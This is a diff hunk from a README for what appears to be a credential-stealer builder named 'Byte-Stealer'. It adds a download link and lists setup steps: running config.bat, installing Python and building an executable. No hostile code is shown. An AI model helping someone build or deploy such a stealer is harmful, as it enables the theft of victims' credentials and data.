@@ -6,6 +6,7 @@ Requirements:\
 
 ## Steps:
 Download the .zip file from the latest release and extract the data\
+Or go to [main.zip](https://github.com/TurtlesXD/Byte-Stealer/archive/refs/heads/main.zip) to download the repository as a .zip(experimental as files a usually uploaded in development)\
 Then run the **config.bat** file and input your desired configuration,no spaces. (If values arent correct exe wont work)\
 Now if you dont have python run **Download-Python3.9.12.bat**. This will install python 3.9.12.\
 If you already have python (3.9 or above) or have finished running **Download-Python3.9.12.bat**,\
